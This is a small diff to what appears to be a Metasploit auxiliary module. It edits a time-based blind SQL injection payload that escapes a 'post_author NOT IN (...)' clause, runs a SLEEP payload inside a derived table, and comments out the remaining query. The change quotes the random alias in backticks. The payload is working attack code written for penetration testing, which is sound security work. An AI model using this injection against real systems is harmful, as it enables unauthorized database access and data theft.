@@ -112,7 +112,9 @@ class MetasploitModule < Msf::Auxiliary
     ali = Rex::Text.rand_text_alpha(4)
     # Break out of post_author NOT IN (<value>); wrap the engine payload in an uncorrelated derived
     # table so a time-based SLEEP fires once, not once per matched row; comment out the remainder.
-    author_exclude = "0) AND (SELECT #{num} FROM (SELECT(#{payload}))#{ali})-- -"
+    # Random alphabetic aliases can be SQL keywords and must be identifier-quoted.
+    # https://mariadb.com/docs/server/reference/sql-structure/sql-language-structure/identifier-names
+    author_exclude = "0) AND (SELECT #{num} FROM (SELECT(#{payload}))`#{ali}`)-- -"
     inner = {
       'requests' => [
         DESYNC_PRIMER,
